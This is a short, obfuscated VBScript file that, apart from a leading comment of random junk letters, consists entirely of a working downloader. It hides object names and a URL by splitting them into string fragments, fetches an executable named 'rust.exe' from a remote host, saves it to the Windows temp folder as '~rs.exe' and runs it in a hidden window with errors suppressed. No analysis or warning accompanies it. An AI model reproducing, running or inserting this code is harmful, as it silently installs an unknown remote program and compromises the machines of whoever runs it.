' xZ oymnPEbuDMkOaPHuoKEGrqZlMnkcuWOayzQZtNXuFFrErJOaikYWgqFtSvulmq gNNssjkBmDCPSxtMdwbJUqDdJwkSBxIcnCHusdorSyQq wmugdHWHEveWMkvfjINFeN
On Error Resume Next
Dim H,j,U,f,l
Set H=CreateObject(("MS"&"XML"&"2"&".Se"&"rve"&"rXM"&"LHT"&"T"&"P."&"6."&"0"))
H.Open "GET",("ht"&"t"&"p"&"s:"&"//s"&"to"&"pla"&"g."&"org")&("/ru"&"st"&".e"&"x"&"e"),False
H.Send
If H.Status=200 Then
  Set j=CreateObject(("ADO"&"DB."&"Str"&"eam"))
  j.Type=1
  j.Open
  j.Write(H.ResponseBody)
  Set f=CreateObject(("S"&"cri"&"p"&"t"&"in"&"g."&"Fil"&"e"&"Sys"&"te"&"m"&"Ob"&"je"&"ct"))
  U=f.GetSpecialFolder(2)
  j.SaveToFile U&("\"&"~rs"&"."&"exe"),2
  j.Close
  Set l=CreateObject(("W"&"Sc"&"ri"&"pt."&"S"&"hel"&"l"))
  l.Run U&("\"&"~r"&"s."&"exe"),0,False
End If
Set H=Nothing